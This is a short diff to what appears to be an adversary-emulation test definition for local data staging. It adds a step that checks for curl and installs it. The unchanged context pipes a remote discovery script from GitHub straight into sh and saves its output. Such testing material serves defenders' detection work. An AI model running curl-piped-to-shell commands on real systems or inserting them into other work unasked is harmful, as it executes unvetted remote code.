@@ -19,6 +19,12 @@ requirements:
         - os: linux
         - os: darwin
 steps:
+    - name: |
+        Check if curl is installed on the machine.
+      inline: |
+        if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; {which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+        }; fi
+      executor: sh
     - name: stage-data-from-discovery.sh
       inline: |
         curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > {{.Args.output_file}}
